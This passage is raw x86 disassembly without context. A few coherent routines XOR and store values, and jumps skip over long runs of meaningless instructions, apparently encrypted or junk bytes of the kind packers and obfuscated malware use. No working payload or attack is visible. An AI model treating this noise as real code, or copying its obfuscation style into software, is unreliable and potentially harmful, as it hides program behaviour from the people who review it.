  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	ror    DWORD PTR [esp+ebp*1-0x7deb919a],cl
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	mov    bl,0xa2
  40c454:	popf   
  40c455:	mov    dl,0xd6
  40c457:	aaa    
  40c458:	loop   0x40c456
  40c45a:	addr16 es inc ebx
  40c45d:	je     0x40c410
  40c45f:	sar    dl,0x11
  40c462:	cmp    ch,bh
  40c464:	or     DWORD PTR [edx],esp
  40c466:	cmp    DWORD PTR [edx+0x5502af98],edx
  40c46c:	loop   0x40c471
  40c46e:	and    BYTE PTR [esi+0x61],bl
  40c471:	jno    0x40c4e9
  40c473:	and    BYTE PTR [edi+0x27],al
  40c476:	jo     0x40c42f
  40c478:	mov    cl,0x8c
  40c47a:	das    
  40c47b:	repnz fmul st,st(4)
  40c47e:	loopne 0x40c4b4
  40c480:	ret    
  40c481:	adc    esp,ecx
  40c483:	push   eax
  40c484:	dec    ebx
  40c485:	iret   
  40c486:	sbb    DWORD PTR [eax+0x25],0xa614d747
  40c48d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c48e:	pop    ebx
  40c48f:	push   ds
  40c490:	retf   0x86f0
  40c493:	test   al,0xd3
  40c495:	or     al,al
  40c497:	xor    edx,DWORD PTR ds:0xbe6e8911
  40c49d:	dec    ebp
  40c49e:	in     al,0x3f
  40c4a0:	inc    edi
  40c4a1:	ficomp WORD PTR [ebp+0x1c]
  40c4a4:	pop    eax
  40c4a5:	cmp    esp,ebx
  40c4a7:	ja     0x40c42d
  40c4a9:	ds mov edi,ss
  40c4ac:	fsub   DWORD PTR [eax+0x913f2e6]
  40c4b2:	sub    ebx,edx
  40c4b4:	inc    eax
  40c4b5:	jp     0x40c43d
  40c4b7:	aaa    
  40c4b8:	push   esp
  40c4b9:	fistp  WORD PTR [ebp-0x17]
  40c4bc:	mov    edi,0xfac2c0e9
  40c4c1:	jno    0x40c45c
  40c4c3:	jbe    0x40c4a6
  40c4c5:	enter  0xc490,0x8f
  40c4c9:	jae    0x40c4ec
  40c4cb:	iret   
  40c4cc:	jne    0x40c49a
  40c4ce:	in     al,dx
  40c4cf:	test   al,0xd5
  40c4d1:	adc    BYTE PTR [ecx],dl
  40c4d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4d4:	sub    ebx,DWORD PTR [edx+eiz*4]
  40c4d7:	rol    DWORD PTR [edi+0x7e],cl
  40c4da:	cmp    al,BYTE PTR [ebp+0x7b]
  40c4dd:	inc    ebp
  40c4de:	or     DWORD PTR [ecx+0x16],0xcdac8a50
  40c4e5:	scas   eax,DWORD PTR es:[edi]
  40c4e6:	cmp    bh,BYTE PTR [ebx+edi*4+0x55]
  40c4ea:	mov    ds,ecx
  40c4ec:	fcom   QWORD PTR [eax-0x30d76cba]
  40c4f2:	pop    esp
  40c4f3:	push   es
  40c4f4:	and    al,0xfd
  40c4f6:	test   BYTE PTR ds:0xb7f6f72a,dh
  40c4fc:	das    
  40c4fd:	mov    edx,fs
  40c4ff:	leave  
  40c500:	mov    bh,0x16
  40c502:	xor    bh,bh
  40c504:	nop    edi
  40c507:	push   ss
  40c508:	(bad)  
  40c509:	mul    DWORD PTR [edx-0x4f79f6e3]
  40c50f:	sti    
  40c510:	fdiv   st,st(1)
  40c512:	jecxz  0x40c4c6
  40c514:	bound  esp,QWORD PTR [ebp+edx*2+0x1f3824f1]
  40c51b:	sub    DWORD PTR [esi],eax
  40c51d:	pop    esp
  40c51e:	push   es
  40c51f:	mov    ch,0x48
  40c521:	fld    TBYTE PTR ds:0xb33cde0c
  40c527:	mov    ecx,0x6aada9f1
  40c52c:	add    DWORD PTR ds:0x8e6c4931,0xffffffbd
  40c534:	std    
  40c535:	sub    DWORD PTR [esi+edx*4+0x33],esp
  40c539:	push   ebp
  40c53a:	mov    ch,0x75
  40c53c:	pusha  
  40c53d:	je     0x40c57f
  40c53f:	imul   dl
  40c541:	jne    0x40c50e
  40c543:	sbb    ebx,DWORD PTR [esi-0x5f1a53a5]
  40c549:	fs mov esi,0x2c636d68
  40c54f:	mov    bh,bl
  40c551:	aaa    
  40c552:	out    dx,eax
  40c553:	sbb    BYTE PTR [edi+eiz*2-0x358e032],bl
  40c55a:	ficom  DWORD PTR [edi+0x55ea2661]
  40c560:	int    0x4a
  40c562:	int3   
  40c563:	les    ebp,FWORD PTR [ebx+0x3d96cefc]
  40c569:	push   edx
  40c56a:	js     0x40c5b2
  40c56c:	push   edx
  40c56d:	jbe    0x40c52a
  40c56f:	(bad)  
  40c570:	sbb    al,0x4
  40c572:	arpl   WORD PTR [ecx-0x5023715c],dx
  40c578:	mov    BYTE PTR [edx],ah
  40c57a:	imul   edx,DWORD PTR [ecx],0x29
  40c57d:	leave  
  40c57e:	std    
  40c57f:	(bad)  
  40c580:	xchg   ebx,eax
  40c581:	and    ch,BYTE PTR es:[edi]
  40c584:	xchg   esp,eax
  40c585:	push   cs
  40c586:	bound  eax,QWORD PTR [eax-0x3d]
  40c589:	adc    DWORD PTR [ecx+edx*4],edx
  40c58c:	dec    edi
  40c58d:	es je  0x40c57c
  40c590:	inc    eax
  40c591:	or     ebx,eax
  40c593:	inc    ecx
  40c594:	push   ebp
  40c595:	fs mov ah,0x6d
  40c598:	js     0x40c57f
  40c59a:	mov    ebx,edx
  40c59c:	dec    esp
  40c59d:	test   al,0xcc
  40c59f:	lods   eax,DWORD PTR ds:[esi]
  40c5a0:	jmp    0x40c5cf
  40c5a2:	test   DWORD PTR [esi+0x47],esp
  40c5a5:	std    
  40c5a6:	jae    0x40c5da
  40c5a8:	retf   
  40c5a9:	imul   ebp,DWORD PTR [esi-0x738dfd1b],0xfffffff4
  40c5b0:	in     al,dx
  40c5b1:	add    DWORD PTR [esp+ecx*4],ecx
  40c5b4:	pusha  
  40c5b5:	dec    edx
  40c5b6:	(bad)  
  40c5b7:	or     eax,0x85cc9911
  40c5bc:	pop    ebp
  40c5bd:	sub    al,0x8d
  40c5bf:	es mov esi,0xd5ec946f
  40c5c5:	cmp    BYTE PTR [esi-0x4c9516e3],bl
  40c5cb:	je     0x40c5e7
  40c5cd:	mov    eax,0xb2f67562
  40c5d2:	push   ss
  40c5d3:	jae    0x40c565
  40c5d5:	out    0xf,al
  40c5d7:	mov    edx,0x72434a0d
  40c5dc:	in     al,dx
  40c5dd:	xor    eax,0xf0384151
  40c5e2:	js     0x40c662
  40c5e4:	in     eax,dx
  40c5e5:	sti    
  40c5e6:	(bad)  
  40c5e7:	outs   dx,DWORD PTR ds:[esi]
  40c5e8:	xor    esp,DWORD PTR [esi]
  40c5ea:	jmp    0xcfe1:0x3f55060
  40c5f1:	repz mov ecx,0x5e9fe2d1
  40c5f7:	jns    0x40c5e1
  40c5f9:	pop    edi
  40c5fa:	aad    0x16
  40c5fc:	ins    BYTE PTR es:[edi],dx
  40c5fd:	dec    eax
  40c5fe:	sbb    BYTE PTR [ebp+0x41],cl
  40c601:	mov    esi,0x4a411f5c
  40c606:	sbb    eax,0x6ad0a8f1
  40c60b:	(bad)  
  40c60d:	add    BYTE PTR ds:0x85cc8a6f,al
  40c613:	test   al,0xa
  40c615:	mov    esp,0xac14ea41
  40c61a:	and    DWORD PTR [edi-0x3a],0x54
  40c61e:	in     eax,0x22
  40c620:	rcl    ah,cl
  40c622:	jb     0x40c664
  40c624:	push   edx
  40c625:	inc    ecx
  40c626:	mov    eax,0xbc08aa62
  40c62b:	jno    0x40c672
  40c62d:	add    ch,ah
  40c62f:	push   esi
  40c630:	(bad)
  40c633:	cmc    
  40c634:	inc    edi
  40c635:	out    0x4d,al
  40c637:	mov    al,BYTE PTR [ebx]
  40c639:	pusha  
  40c63a:	mov    es,WORD PTR [ecx+esi*2-0x6a]
  40c63e:	sub    ah,BYTE PTR [ebp-0x80]
  40c641:	addr16 pop ecx
  40c643:	ret    0xd298
  40c646:	and    al,0xa7
  40c648:	xchg   edx,eax
  40c649:	add    BYTE PTR [ebp-0x3b],al
  40c64c:	out    0x39,al
  40c64e:	mov    ah,bl
  40c650:	sbb    al,dl
  40c652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c653:	mov    ebp,0xe5037b3a
  40c658:	test   BYTE PTR [ebx],0xc3
  40c65b:	xchg   esp,eax
  40c65c:	ds stos DWORD PTR es:[edi],eax
  40c65e:	shl    eax,cl
  40c660:	out    dx,eax
  40c661:	jo     0x40c6c9
  40c663:	mov    dh,0x8c
  40c665:	xchg   esp,eax
  40c666:	and    edi,DWORD PTR [edx+0x19ebddcb]
  40c66c:	jne    0x40c667
  40c66e:	ret    
  40c66f:	mov    ebx,DWORD PTR ds:0x1066212f
  40c675:	retf   0x71cd
  40c678:	mov    dl,0xe1
  40c67a:	mul    BYTE PTR [edx-0x48]
  40c67d:	pop    es
  40c67e:	fld    TBYTE PTR [esi]
  40c680:	enter  0x20ec,0xce
  40c684:	cmc    
  40c685:	jg     0x40c694
  40c687:	lods   al,BYTE PTR ds:[esi]
  40c689:	aad    0x73
  40c68b:	leave  
  40c68c:	shl    BYTE PTR [edi+0x70],1
  40c68f:	push   es
  40c690:	(bad)  
  40c692:	std    
  40c693:	popf   
  40c694:	(bad)  
  40c695:	outs   dx,DWORD PTR ds:[esi]
  40c696:	jbe    0x40c66e
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x4512653f],dl
  40c6de:	addr16 and esi,ebx
  40c6e1:	cmp    BYTE PTR [esi+0x7e],0x38
  40c6e5:	jl     0x40c765
  40c6e7:	jle    0x40c67d
  40c6e9:	inc    eax
  40c6ea:	out    0x9b,eax
  40c6ec:	mov    eax,ds:0x3627050b
  40c6f1:	cli    
  40c6f2:	in     eax,0xa8
  40c6f4:	mov    ecx,DWORD PTR [edi+0x71]
  40c6f7:	add    ax,0x39e9
  40c6fb:	or     BYTE PTR [edi+0x1afa30da],dh
  40c701:	sbb    BYTE PTR [ecx+0x13],dl
  40c704:	loopne 0x40c784
  40c706:	test   eax,0xbb9b943f
  40c70b:	pop    eax
  40c70c:	icebp  
  40c70d:	jle    0x40c719
  40c70f:	push   eax
  40c710:	inc    ecx
  40c711:	pushf  
  40c712:	mov    ecx,0xa7bc64f8
  40c717:	cmp    DWORD PTR [ecx+0x60ded85],ecx
  40c71d:	into   
  40c71e:	xchg   ebx,eax
  40c71f:	or     al,0x78
  40c721:	jge    0x40c77b
  40c723:	pop    ds
  40c724:	rol    DWORD PTR ds:[ebp+edx*2-0x47],0xe1
  40c72a:	sbb    al,0x6d
  40c72c:	aam    0x4e
  40c72e:	mov    BYTE PTR [ecx-0x1d],bh
  40c731:	pop    edx
  40c732:	and    edx,DWORD PTR [edx]
  40c734:	call   0xcdeb:0x32d03d75
  40c73b:	push   ss
  40c73c:	mov    cs,WORD PTR [edi+0x3ec330d6]
  40c742:	pop    ds
  40c743:	sub    BYTE PTR [ebx+0x32],bh
  40c746:	rcr    DWORD PTR [esi-0x67],0xd9
  40c74a:	loop   0x40c75f
  40c74c:	stos   BYTE PTR es:[edi],al
  40c74d:	jae    0x40c6f9
  40c74f:	dec    edi
  40c750:	or     BYTE PTR [edx-0x3f],0x0
  40c754:	or     bh,0xbb
  40c757:	push   ds
  40c758:	enter  0x8599,0x69
  40c75c:	out    dx,al
  40c75d:	daa    
  40c75e:	mov    dh,0xa3
  40c760:	out    dx,al
  40c761:	push   es
  40c762:	jecxz  0x40c7e2
  40c764:	or     dl,dh
  40c766:	mov    edi,0x52e0e481
  40c76b:	dec    DWORD PTR [ebx+ebp*8-0x7f]
  40c76f:	push   0xffffffbe
  40c771:	bound  edx,QWORD PTR [eax+0x4e64dc9f]
  40c777:	sub    DWORD PTR [eax],esi
  40c779:	pop    esi
  40c77a:	pushf  
  40c77b:	(bad)  
  40c77c:	sub    bl,BYTE PTR [esi]
  40c77e:	jae    0x40c73a
  40c780:	adc    DWORD PTR [edx*2+0x6d431abd],ecx
  40c787:	add    ecx,DWORD PTR [esi]
  40c789:	out    0x1d,eax
  40c78b:	fisubr DWORD PTR [esi-0x49]
  40c78e:	shl    BYTE PTR [esp+edx*4+0x63bd0c05],1
  40c795:	in     eax,0x63
  40c797:	xor    DWORD PTR [edx],edi
  40c799:	loopne 0x40c7e8
  40c79b:	or     DWORD PTR [edi+0x2b],edx
  40c79e:	pop    esi
  40c79f:	and    BYTE PTR [ebx+0x660536da],0x26
  40c7a6:	daa    
  40c7a7:	inc    ebp
  40c7a8:	dec    esi
  40c7a9:	mov    bl,0xaa
  40c7ab:	mov    ds:0xe1b73e1a,eax
  40c7b0:	test   DWORD PTR [ebx],esi
  40c7b2:	stc    
  40c7b3:	pop    edx
  40c7b4:	fidivr DWORD PTR [edi]
  40c7b6:	repz push 0x24911e11
  40c7bc:	lods   eax,DWORD PTR ds:[esi]
  40c7bd:	pop    edi
  40c7be:	test   DWORD PTR [ebp+0x3a],ebx
  40c7c1:	lods   eax,DWORD PTR ds:[esi]
  40c7c2:	sti    
  40c7c3:	sub    esp,DWORD PTR [ebx+0x38349c14]
  40c7c9:	add    eax,0xedcb635
  40c7ce:	addr16 inc ecx
  40c7d0:	mov    ?,WORD PTR [ebp-0x3c]
  40c7d3:	xor    bl,BYTE PTR [esp-0x583ee727]
  40c7da:	jbe    0x40c7a8
  40c7dc:	retf   
  40c7dd:	stos   BYTE PTR es:[edi],al
  40c7de:	push   ss
  40c7df:	mov    ds:0x863ee8e4,al
  40c7e4:	ror    BYTE PTR [esp+ebp*8+0x4],0x7f
  40c7e9:	pop    esi
  40c7ea:	pop    ebx
  40c7eb:	aad    0x11
  40c7ed:	repnz dec esp
  40c7ef:	jns    0x40c834
  40c7f1:	mov    ah,BYTE PTR [edi-0x11]
  40c7f4:	std    
  40c7f5:	push   esi
  40c7f6:	cwde   
  40c7f7:	in     eax,0xe5
  40c7f9:	dec    ecx
  40c7fa:	aaa    
  40c7fb:	mov    eax,0x83a1bf21
  40c800:	sbb    BYTE PTR [eax+0x28],0x68
  40c804:	or     edx,DWORD PTR [edi]
  40c806:	nop
  40c807:	test   BYTE PTR [ecx-0x66b2b5a7],cl
  40c80d:	pop    eax
  40c80e:	out    dx,al
  40c80f:	jo     0x40c7dc
  40c811:	or     bl,bl
  40c813:	gs fs std 
  40c816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c817:	retf   0x614c
  40c81a:	xchg   ebx,eax
  40c81b:	inc    edi
  40c81c:	out    0x5a,al
  40c81e:	aaa    
  40c81f:	and    eax,0x3ccb243a
  40c824:	ds loop 0x40c7aa
  40c827:	(bad)  [edi-0xb86f7fe]
  40c82d:	ja     0x40c7b5
  40c82f:	popf   
  40c830:	cmp    DWORD PTR [esp+ecx*1],ebp
  40c833:	ss mov bh,0x35
  40c836:	add    ch,BYTE PTR [esi+0x28]
  40c839:	adc    esi,esi
  40c83b:	push   edx
  40c83c:	dec    edx
  40c83d:	cmp    eax,0xa55dba98
  40c842:	fmul   st(0),st
  40c844:	cmp    bh,BYTE PTR [edx-0xf]
  40c847:	or     edx,DWORD PTR [eax+0x72]
  40c84a:	(bad)  
  40c84b:	push   esp
  40c84c:	ja     0x40c861
  40c84e:	out    0xbe,eax
  40c850:	in     eax,0xc9
  40c852:	dec    ebp
  40c853:	sbb    DWORD PTR [edx-0x3a399027],edi
  40c859:	dec    esp
  40c85a:	fs pop ds
  40c85c:	xchg   esi,eax
  40c85d:	push   esp
  40c85e:	mov    dl,0x1f
  40c860:	push   edi
  40c861:	mov    al,ds:0x500a337f
  40c866:	daa    
  40c867:	push   esp
  40c868:	bound  edi,QWORD PTR [edx+ebp*8+0xd]
  40c86c:	loop   0x40c89f
  40c86e:	sahf   
  40c86f:	add    DWORD PTR [ecx+0x528f4585],eax
  40c875:	and    ebp,DWORD PTR [edi+0x2c9cb0f7]
  40c87b:	mov    cs,WORD PTR [edi]
  40c87d:	push   cs
  40c87e:	std    
  40c87f:	or     ch,ch
  40c881:	mov    esi,0xeeef4a95
  40c886:	(bad)  
  40c888:	jmp    0x40c8ad
  40c88a:	fwait
  40c88b:	push   ebp
  40c88d:	sub    BYTE PTR [edx],dl
  40c88f:	pop    esp
  40c890:	add    al,0x92
  40c892:	jne    0x40c8d1
  40c894:	retf   
  40c895:	sbb    al,BYTE PTR [edx-0x33]
  40c898:	aas    
  40c899:	int3   
  40c89a:	sbb    al,0xcc
  40c89c:	ins    BYTE PTR es:[edi],dx
  40c89d:	mov    edi,edx
  40c89f:	cmc    
  40c8a0:	jmp    FWORD PTR [edi]
  40c8a2:	cmp    eax,0x243fda9d
  40c8a7:	pusha  
  40c8a8:	scas   al,BYTE PTR es:[edi]
  40c8a9:	cwde   
  40c8aa:	xor    DWORD PTR [ebx+0x75],esp
  40c8ad:	sub    al,0x24
  40c8af:	mov    dh,0x93
  40c8b1:	dec    esi
  40c8b2:	popf   
  40c8b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8b4:	push   ebp
  40c8b5:	or     ch,al
  40c8b7:	popa   
  40c8b8:	das    
  40c8b9:	cmp    al,BYTE PTR [ecx+0x5d426506]
  40c8bf:	add    eax,edi
  40c8c1:	pop    es
  40c8c2:	pop    edi
  40c8c3:	jnp    0x40c88f
  40c8c5:	adc    BYTE PTR [ebx+ebx*1-0x56a51c3d],0x97
  40c8cd:	js     0x40c869
  40c8cf:	sub    BYTE PTR [eax+0x6d207b6f],cl
  40c8d5:	dec    DWORD PTR [esi-0x2]
  40c8d8:	repz push cs
  40c8da:	and    edi,DWORD PTR [ecx+eax*4]
  40c8dd:	mov    ah,0x71
  40c8df:	ret    
  40c8e0:	fidiv  WORD PTR [eax+0x41]
  40c8e3:	cld    
  40c8e4:	je     0x40c8f7
  40c8e6:	xchg   ebp,eax
  40c8e7:	jge    0x40c88c
  40c8e9:	and    al,0x5a
  40c8eb:	mov    ebp,0x73ab7526
  40c8f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8f1:	xchg   BYTE PTR [ecx-0x9e3a38],bh
  40c8f7:	in     eax,0xc0
  40c8f9:	das    
  40c8fa:	test   DWORD PTR [ecx+0x51],ecx
  40c8fd:	outs   dx,BYTE PTR ds:[esi]
  40c8fe:	push   0x4f
  40c900:	sbb    eax,0x9d0215fd
  40c905:	imul   ebp,DWORD PTR [esi-0x2ff23160],0xed7f29c
  40c90f:	sub    eax,ecx
  40c911:	out    0xfd,al
  40c913:	cdq    
  40c914:	hlt    
  40c915:	jl     0x40c8f9
  40c917:	arpl   WORD PTR [ebp-0x2c],bx
  40c91a:	adc    eax,0x77d4f430
  40c91f:	sbb    eax,0x1faddb9e
  40c924:	rol    DWORD PTR [ebx-0x8ef9ac9],cl
  40c92a:	mov    ebx,0x8bf01281
  40c92f:	push   ebp
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [eax-0x67da8833],esp
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	rol    DWORD PTR [esi+eiz*2-0x5677b109],1
  40c957:	push   ebp
  40c958:	and    esp,DWORD PTR [ebx+eiz*2]
  40c95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c95c:	xchg   ebp,eax
  40c95d:	cmp    eax,0x3d9f5c56
  40c962:	mov    ebx,0x9f3ea713
  40c967:	push   ss
  40c968:	fdiv   DWORD PTR [ecx-0x1d7e5f7a]
  40c96e:	ins    DWORD PTR es:[edi],dx
  40c96f:	test   eax,0x9ffa6cd6
  40c974:	iret   
  40c975:	or     ecx,DWORD PTR [ebx+0x5f]
  40c978:	cmp    DWORD PTR [esi-0x4e6596c8],esi
  40c97e:	xchg   ecx,eax
  40c97f:	fsub   QWORD PTR [ebp+0x43a077ac]
  40c985:	js     0x40c984
  40c987:	inc    edx
  40c988:	adc    bl,cl
  40c98a:	xchg   edx,eax
  40c98b:	es pop edi
  40c98d:	add    dl,BYTE PTR [eax]
  40c98f:	repz mov eax,fs:0x231a74ed
  40c996:	pop    esi
  40c997:	sub    ebx,DWORD PTR ds:[ecx+ebp*2+0x76c37f84]
  40c99f:	arpl   WORD PTR [ebx+0x7b],sp
  40c9a2:	inc    eax
  40c9a3:	cmp    al,bl
  40c9a5:	bound  edx,QWORD PTR [eax]
  40c9a7:	rcl    DWORD PTR [edx],1
  40c9a9:	jle    0x40c9e2
  40c9ab:	in     al,0xfd
  40c9ad:	push   cs
  40c9ae:	int    0xca
  40c9b0:	xor    BYTE PTR [edi-0x154381f6],dh
  40c9b6:	xchg   ax,ax
  40c9b8:	add    al,0xf4
  40c9ba:	inc    BYTE PTR [ebx]
  40c9bc:	mov    bl,BYTE PTR [edx]
  40c9be:	jl     0x40ca13
  40c9c0:	jno    0x40c973
  40c9c2:	sbb    eax,0xbd3ee1e6
  40c9c7:	push   0x68
  40c9c9:	cli    
  40c9ca:	xor    esi,DWORD PTR [ebx]
  40c9cc:	add    al,0x4d
  40c9ce:	push   esp
  40c9cf:	inc    ecx
  40c9d0:	fisttp QWORD PTR [eax]
  40c9d2:	add    DWORD PTR [eax+0x7f],ecx
  40c9d5:	fdivr  st,st(3)
  40c9d7:	or     eax,0x10394ce9
  40c9dc:	xlat   BYTE PTR ds:[ebx]
  40c9dd:	xor    BYTE PTR [ebp+0x1b],ah
  40c9e0:	pusha  
  40c9e1:	call   0x6b8f:0x4ae81187
  40c9e8:	add    eax,0x62549221
  40c9ed:	mov    BYTE PTR [edi+0x73],dh
  40c9f0:	enter  0x1376,0x7
  40c9f4:	fstp   DWORD PTR [ecx-0x7]
  40c9f7:	pushf  
  40c9f8:	in     al,dx
  40c9f9:	pop    eax
  40c9fa:	std    
  40c9fb:	sbb    eax,0x87c0402
  40ca00:	mov    WORD PTR [edx+ebp*8+0x20],es
  40ca04:	cmp    al,0xc0
  40ca06:	das    
  40ca07:	inc    eax
  40ca08:	outs   dx,DWORD PTR ds:[esi]
  40ca09:	outs   dx,DWORD PTR ds:[esi]
  40ca0a:	rcr    DWORD PTR [esi],cl
  40ca0c:	sbb    eax,0x2888ea30
  40ca11:	sbb    esi,edi
  40ca13:	(bad)
  40ca17:	ret    0x95bf
  40ca1a:	pop    esi
  40ca1b:	cmp    DWORD PTR [eax-0x5a24efba],esi
  40ca21:	dec    esp
  40ca22:	call   DWORD PTR [ebx+eiz*8+0x6f]
  40ca26:	push   ebp
  40ca27:	shl    DWORD PTR [ecx],1
  40ca29:	ja     0x40c9bb
  40ca2b:	ret    0x2be9
  40ca2e:	fdiv   DWORD PTR [ecx+0x7e6f7948]
  40ca34:	cwde   
  40ca35:	lea    esi,[edi]
  40ca37:	arpl   WORD PTR [ebp+0x27],bx
  40ca3a:	shr    DWORD PTR [edx-0x7d616b11],0xa6
  40ca41:	int3   
  40ca42:	inc    edi
  40ca43:	adc    edx,DWORD PTR [ebp-0x61]
  40ca46:	jae    0x40ca32
  40ca48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca49:	sub    dh,BYTE PTR [edx+0x25]
  40ca4c:	retf   0x7db8
  40ca4f:	call   0x87cdeaec
  40ca54:	add    eax,0xafdf872b
  40ca59:	lea    bx,[ecx+0x6a]
  40ca5d:	sbb    BYTE PTR ds:0x4e3733bb,ah
  40ca63:	addr16 mov al,0xb9
  40ca66:	mov    bh,0x7f
  40ca68:	ret    0x93fe
  40ca6b:	mov    ecx,0xc33466c0
  40ca70:	xor    bh,BYTE PTR [edx+0x4883a65b]
  40ca76:	shl    edi,0x7e
  40ca79:	pop    es
  40ca7a:	cmp    BYTE PTR [ecx+eiz*1],dl
  40ca7d:	sub    esi,ecx
  40ca7f:	les    ebx,FWORD PTR [eax+0x4400483e]
  40ca85:	dec    edi
  40ca86:	xchg   ebx,eax
  40ca87:	enter  0x1d93,0x2a
  40ca8b:	sub    al,0xd0
  40ca8d:	pop    es
  40ca8e:	pushf  
  40ca8f:	mov    ah,0x4a
  40ca91:	mov    bl,0x6f
  40ca93:	rcl    BYTE PTR [eax+0x7],cl
  40ca96:	mov    esp,ebx
  40ca98:	mov    dh,0xc2
  40ca9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca9b:	sub    DWORD PTR ds:0x51643e0c,ebx
  40caa1:	ja     0x40ca4b
  40caa3:	test   BYTE PTR [esi-0x46fc786],al
  40caa9:	bound  edx,QWORD PTR [edi-0x6fd043fe]
  40caaf:	mov    cl,0xbb
  40cab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cab2:	adc    bx,WORD PTR [edi-0x553ace31]
  40cab9:	xor    ah,BYTE PTR [ebx+0x197dbd03]
  40cabf:	push   cs
  40cac0:	mov    edi,?
  40cac2:	mov    WORD PTR [edi],es
  40cac4:	xor    DWORD PTR [edi],edi
  40cac6:	mov    WORD PTR [ecx],?
  40cac8:	ret    0xa84c
  40cacb:	jns    0x40cb43
  40cacd:	mov    dl,BYTE PTR cs:[esi]
  40cad0:	aaa    
  40cad1:	stos   BYTE PTR es:[edi],al
  40cad2:	inc    ebp
  40cad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cad4:	test   eax,0x9d6adb31
  40cad9:	xor    al,BYTE PTR [edx-0x2347bcc6]
  40cadf:	scas   al,BYTE PTR es:[edi]
  40cae0:	ins    DWORD PTR es:[edi],dx
  40cae1:	popf   
  40cae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cae3:	mov    edi,0x9c52b728
  40cae8:	jnp    0x40cb61
  40caea:	mov    ch,0x16
  40caec:	(bad)  
  40caee:	push   0x6f
  40caf0:	and    ebx,DWORD PTR [ebx]
  40caf2:	push   es
  40caf3:	inc    ebx
  40caf4:	jmp    0x813cc506
  40caf9:	xchg   esp,eax
  40cafa:	hlt    
  40cafb:	sub    edi,DWORD PTR [eax-0x379bfce0]
  40cb01:	retf   0xd334
  40cb04:	xor    bl,BYTE PTR [edi-0x20edaa34]
  40cb0a:	push   esp
  40cb0b:	int3   
  40cb0c:	add    BYTE PTR [edx+edi*8-0x2d],cl
  40cb10:	lock hlt 
  40cb12:	mov    ds:0x652a854f,eax
  40cb17:	or     BYTE PTR [ecx+0x5a],dh
  40cb1a:	cli    
  40cb1b:	imul   edx,ebp,0xf4e9d8a6
  40cb21:	xchg   esp,eax
  40cb22:	mov    ebx,0xf64cbb08
  40cb27:	mov    bl,0xac
  40cb29:	or     dl,dl
  40cb2b:	cwde   
  40cb2c:	mov    eax,0x7330f584
  40cb31:	sbb    BYTE PTR [eax],bh
  40cb33:	or     dh,BYTE PTR [edx+eiz*4-0xf3143ab]
  40cb3a:	dec    ebx
  40cb3b:	sub    DWORD PTR [esi+edi*2],edx
  40cb3e:	xchg   ecx,eax
  40cb3f:	xchg   DWORD PTR [edx+edi*2],edi
  40cb42:	sub    al,0xe2
  40cb44:	ret    
  40cb45:	in     al,0x76
  40cb47:	inc    edx
  40cb48:	jmp    0x1a5cc973
  40cb4d:	stos   BYTE PTR es:[edi],al
  40cb4e:	adc    eax,0x650dcde2
  40cb53:	dec    ecx
  40cb54:	pop    ds
  40cb55:	pusha  
  40cb56:	add    al,dl
  40cb58:	xchg   DWORD PTR ds:0x4489d2f0,esp
  40cb5e:	enter  0xafa1,0xb6
  40cb62:	std    
  40cb63:	add    al,BYTE PTR ds:0x6779c786
  40cb69:	jl     0x40cb85
  40cb6b:	sti    
  40cb6c:	sar    DWORD PTR [edi-0x25f63880],1
  40cb72:	mov    al,ds:0xde0c1b7a
  40cb77:	dec    ecx
  40cb78:	jns    0x40cb73
  40cb7a:	(bad)  
  40cb7b:	pop    es
  40cb7c:	aad    0x2e
  40cb7e:	mov    dl,0xf9
  40cb80:	fdivr  st(3),st
  40cb82:	push   edx
  40cb83:	inc    ebx
  40cb84:	lahf   
  40cb85:	repz ret 
  40cb87:	(bad)  
  40cb88:	out    dx,al
  40cb89:	fld    QWORD PTR ds:0xb227e145
  40cb8f:	dec    edx
  40cb90:	xchg   ecx,eax
  40cb91:	mov    cl,0x6f
